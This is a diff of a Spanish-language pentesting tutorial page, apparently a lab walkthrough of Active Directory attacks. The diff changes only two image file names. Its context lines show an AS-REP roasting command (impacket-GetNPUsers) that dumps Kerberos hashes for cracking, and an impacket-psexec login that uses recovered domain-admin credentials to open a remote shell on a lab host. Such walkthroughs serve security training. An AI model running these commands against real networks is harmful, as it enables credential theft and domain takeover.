@@ -100,7 +100,7 @@ Una vez lo tenemos almacenados utilizamos impacket-GetNPUsers para comprobar cua
 
 `impacket-GetNPUsers hackpoc/ -usersfile users.txt -format hashcat -outputfile as_rep.txt`
 
-![Hash krb5asrep conseguido](<../../.gitbook/assets/as\_rep2 (2).png>)
+![Hash krb5asrep conseguido](<../../.gitbook/assets/as\_rep2 (2) (1).png>)
 
 ### 2. Crackear el Hash
 
@@ -125,7 +125,7 @@ El usuario que hemos obtenido es un usuario administrador de dominio por lo que 
 
 `impacket-psexec hackpoc/SVC-SQLService:MYpassword123#@192.168.1.100 cmd.exe`
 
-![¡Premio!](<../../.gitbook/assets/imagen (75).png>)
+![¡Premio!](<../../.gitbook/assets/imagen (83).png>)
 
 ## REFERENCIAS
 
